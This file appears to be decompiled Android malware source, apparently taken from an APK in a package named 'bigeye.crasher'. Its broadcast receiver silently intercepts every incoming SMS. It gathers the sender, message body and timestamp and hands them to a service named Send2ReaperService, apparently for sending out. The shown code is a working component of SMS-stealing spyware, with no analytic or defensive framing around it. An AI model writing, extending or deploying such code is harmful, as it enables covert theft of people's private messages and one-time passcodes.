package com.bigeye.crasher;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.text.format.DateFormat;
import android.util.Log;
/* loaded from: classes.dex */
public class IncomingSMSBroadcastReceiver extends BroadcastReceiver {
    public String APP_TAG = "IncomingSMSBroadcastReceiver";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        String smsContent = "SMS from: ";
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            SmsMessage[] msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                if (i == 0) {
                    smsContent = (smsContent + msgs[i].getOriginatingAddress()) + ": ";
                }
                new DateFormat();
                String tmp_dt = DateFormat.format("dd-MMM-yyyy k:m:s", msgs[i].getTimestampMillis()).toString();
                smsContent = (smsContent + msgs[i].getMessageBody().toString()) + ": " + tmp_dt;
            }
            Log.i(this.APP_TAG, smsContent);
            Intent SvcIntent = new Intent(context, Send2ReaperService.class);
            SvcIntent.putExtra("OPERATION", "INCOMING");
            SvcIntent.putExtra("MSG", smsContent);
            context.startService(SvcIntent);
        }
    }
}
